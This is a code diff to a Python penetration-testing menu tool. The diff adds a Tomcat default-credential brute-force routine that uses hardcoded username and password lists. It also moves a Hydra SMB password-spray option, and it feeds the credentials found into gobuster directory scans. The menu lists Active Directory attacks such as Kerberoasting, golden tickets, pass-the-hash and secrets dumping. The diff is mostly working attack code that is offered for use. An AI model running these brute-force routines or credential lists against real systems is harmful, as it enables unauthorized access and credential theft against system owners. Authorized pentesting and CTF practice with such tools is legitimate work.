@@ -20,6 +20,7 @@ import os.path
 import hashlib
 import binascii
 import datetime
+import requests
 import linecache
 
 from termcolor import colored	# PIP INSTALL TERMCOLOR
@@ -286,15 +287,15 @@ def display():
 
 def options():
    print('\u2551' + "(0) REMOTE IP Scanner (10) Re/Set SHARENAME (20) Get Arch (30) Enum4Linux     (40) Kerb User Info  (50) Golden PAC   (60) GenSSHKeyID (70) GoBuster  (80) SQSH IP  " + '\u2551')
-   print('\u2551' + "(1) Re/Set DNS SERVER (11) Re/Set CLOCKTIME (21) Net View (31) WinDap Search  (41) Kerb UserFilter (51) Domain Dump  (61) GenUSERList (71) Hydra SMB (81) SSH IP   " + '\u2551')
+   print('\u2551' + "(1) Re/Set DNS SERVER (11) Re/Set CLOCKTIME (21) Net View (31) WinDap Search  (41) Kerb UserFilter (51) Domain Dump  (61) GenUSERList (71)           (81) SSH IP   " + '\u2551')
    print('\u2551' + "(2) Re/Set REMOTE IP  (12) Re/Set DIRECTORY (22) Services (32) Lookup Sids    (42) Kerb Bruteforce (52) BloodHound   (62) GenPassList (72)           (82) SSH ID IP" + '\u2551')
    print('\u2551' + "(3) Re/Set LIVE PORTS (13) Check Connection (23) AtExec   (33) SamDump Users  (43) Kerb Roasting   (53) ACLPwn       (63) USER Editor (73)           (83) MySQL IP " + '\u2551')
    print('\u2551' + "(4) Re/Set WEBADDRESS (14) Check DNS Record (24) DcomExec (34) RpcDump        (44) Kerb ASREPRoast (54) Secrets Dump (64) PASS Editor (74)           (84) Telnet IP" + '\u2551')
    print('\u2551' + "(5) Re/Set USERNAME   (15) Check DNS Server (25) PsExec   (35) REGistery      (45) PASSWORD2HASH   (55) CrackMapExec (65) HOST Editor (75)           (85) Netcat IP" + '\u2551')
    print('\u2551' + "(6) Re/Set PASSWORD   (16) FScan LIVE PORTS (26) SmbExec  (36) SmbClient      (46) Pass the HASH   (56) PSExec HASH  (66)             (76) FTP IP    (86) EvilWinRm" + '\u2551')
    print('\u2551' + "(7) Re/Set NTLM HASH  (17) DScan LIVE PORTS (27) WmiExec  (37) SmbMap SHARE   (47) Pass the Ticket (57) SmbExec HASH (67)             (77) TFPS IP   (87) RDesktop " + '\u2551')
-   print('\u2551' + "(8) Re/Set DOMAINNAME (18) Fuzz SubDOMAINS  (28) IfMap    (38) SmbMount SHARE (48) Silver Ticket   (58) WmiExec HASH (68)             (78) SFTP IP   (88) XFreeRDP " + '\u2551')
-   print('\u2551' + "(9) Re/Set DOMAINSID  (19) Server ClockTime (29) OpDump   (39) RpcClient      (49) Golden Ticket   (59) GPP Decrypt  (69)             (79) PFTP IP   (89) Save&Exit" + '\u2551')
+   print('\u2551' + "(8) Re/Set DOMAINNAME (18) Fuzz SubDOMAINS  (28) IfMap    (38) SmbMount SHARE (48) Silver Ticket   (58) WmiExec HASH (68) Hydra SMB   (78) SFTP IP   (88) XFreeRDP " + '\u2551')
+   print('\u2551' + "(9) Re/Set DOMAINSID  (19) Server ClockTime (29) OpDump   (39) RpcClient      (49) Golden Ticket   (59) GPP Decrypt  (69) TomCatBrute (79) PFTP IP   (89) Save/Exit" + '\u2551')
    print('\u255A' + ('\u2550')*163 + '\u255D')
 
 # -------------------------------------------------------------------------------------
@@ -1569,7 +1570,7 @@ while True:
 # CONTRACT: GitHub
 # Version : Fuse
 # Details : Menu option selected - kerbrute.py -domain DOMAIN -users usernames.txt -passwords passwords.txt -outputfile optional.txt.
-# Modified: N/A
+# Modified: NOTE - THIS DOES NOT CURRENTLY DEAL WITH FOUND MULTIPLE USERS!!!
 # -------------------------------------------------------------------------------------
 
    if selection =='42':
@@ -2294,51 +2295,11 @@ while True:
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
 # Version : Fuse
-# Details : Menu option selected - Exit(1)
+# Details : Menu option selected - HYDRA SMB BRUTEFORCE
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
    if selection =='68':
-      exit(1)
-
-#------------------------------------------------------------------------------------- 
-# AUTHOR  : Terence Broadbent                                                    
-# CONTRACT: GitHub
-# Version : Fuse
-# Details : Menu option selected - Exit(1)
-# Modified: N/A
-# -------------------------------------------------------------------------------------
-
-   if selection =='69':
-      exit(1)         
-
-#------------------------------------------------------------------------------------- 
-# AUTHOR  : Terence Broadbent                                                    
-# CONTRACT: GitHub
-# Version : Fuse
-# Details : Menu option selected - GoBuster with common.txt
-# Modified: N/A
-# -------------------------------------------------------------------------------------
-
-   if selection =='70':
-      if TIP[:5] == "EMPTY":
-         print("\n[-] Remote IP address has not been specified...")
-      else:
-         if WEB[:5] != "EMPTY":
-            command("gobuster dir -k -u " + WEB.rstrip(" ") + " -x bak,zip,php,html,pdf,txt -f -w /usr/share/wordlists/dirb/common.txt -t 50")
-         else:
-            command("gobuster dir -k -u " + TIP.rstrip(" ") + " -x bak,zip,php,html,pdf,txt -f -w /usr/share/wordlists/dirb/common.txt -t 50")
-      prompt()
-      
-#------------------------------------------------------------------------------------- 
-# AUTHOR  : Terence Broadbent                                                    
-# CONTRACT: GitHub
-# Version : Fuse
-# Details : Menu option selected - HYDRA SMB PASSWORD SPRAY
-# Modified: N/A
-# -------------------------------------------------------------------------------------
-
-   if selection =='71':
       CheckParams = 0   
 
       if TIP[:5] == "EMPTY":
@@ -2365,7 +2326,75 @@ while True:
                command("echo password >> passwords.txt")
          
          command("hydra -P passwords.txt -L usernames.txt smb://" + TIP.rstrip(" "))
-      prompt()   
+      prompt() 
+
+#------------------------------------------------------------------------------------- 
+# AUTHOR  : Terence Broadbent                                                    
+# CONTRACT: GitHub
+# Version : Fuse
+# Details : Menu option selected - TOMCAT BRUTEFORCE
+# Modified: N/A
+# CREDIT  : https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt
+# -------------------------------------------------------------------------------------
+
+   if selection =='69':
+      if WEB[:5] == "EMPTY":
+         print("[-] Target web address not specified...")
+      else:
+         print("[*] Attempting a tomcat bruteforce on the specified web address, please wait...")
+         
+         TomUser = ["", "admin", "ADMIN", "both", "cxsdk", "j2deployer", "manager", "ovwebusr", "QCC", "role1", "role", "tomcat", "xampp", "server_admin", "demo", "r00t", "root"]
+         TomPass = ["", "admanager", "admin", "ADMIN", "adrole1", "adroot", "ads3cret", "adtomcat", "advagrant", "password", "password1", "tomcat", "vagrant", "ads3cret", "adtomcat", "kdsxc", "j2deployer", "OvW*busr1", "QLogic66", "changethis", "owaspbwa", "toor", "xampp", "demo", "s3cret", "r00t", "root"]
+      
+         outer=len(TomUser)
+         inner=len(TomPass)
+      
+         for x in range (0, outer):
+            for y in range (0, inner):
+               r = requests.get(WEB.rstrip(" "), auth=(TomUser[x], TomPass[y]))
+               brute = WEB.rstrip(" ") + " " + TomUser[x] + ":" + TomPass[y]
+               
+               if r.status_code == 401:
+                  brute = "[-] " + brute
+                  if BUG == 1: print(brute)				# DISPLAY CREDS NOT FOUND
+                  
+               if r.status_code == 200:
+                  brute = "[+] " + brute
+                  print(colored(brute,colour2, attrs=['bold']))
+                  if USR[:1] == "'": USR = TomUser[x].rstrip(" ")	# SET TO LAST CREDS FOUND
+                  if PAS[:1] == "'":PAS = TomPass[y].rstrip(" ")		# SET TO LAST CREDS FOUND
+                  if len(USR) < COL1: USR = padding(USR, COL1)
+                  if len(PAS) < COL1: PAS = padding(PAS, COL1)
+      prompt()
+      
+#------------------------------------------------------------------------------------- 
+# AUTHOR  : Terence Broadbent                                                    
+# CONTRACT: GitHub
+# Version : Fuse
+# Details : Menu option selected - GoBuster with common.txt
+# Modified: N/A
+# -------------------------------------------------------------------------------------
+
+   if selection =='70':
+      if TIP[:5] == "EMPTY":
+         print("\n[-] Remote IP address has not been specified...")
+      else:
+         if WEB[:5] != "EMPTY":
+            command("gobuster dir -r -U " + USR.rstrip(" ") + " -P " + PAS.rstrip(" ") + " -u " + WEB.rstrip(" ") + " -x bak,zip,php,html,pdf,txt,doc,xml -f -w /usr/share/wordlists/dirb/common.txt -t 50")
+         else:
+            command("gobuster dir -r -U " + USR.rstrip(" ") + " -P " + PAS.rstrip(" ") + " -u " + TIP.rstrip(" ") + " -x bak,zip,php,html,pdf,txt,doc,xml -f -w /usr/share/wordlists/dirb/common.txt -t 50")
+      prompt()
+      
+#------------------------------------------------------------------------------------- 
+# AUTHOR  : Terence Broadbent                                                    
+# CONTRACT: GitHub
+# Version : Fuse
+# Details : Menu option selected - Exit (1)
+# Modified: N/A
+# -------------------------------------------------------------------------------------
+
+   if selection =='71':
+      exit(1)  
       
  #------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
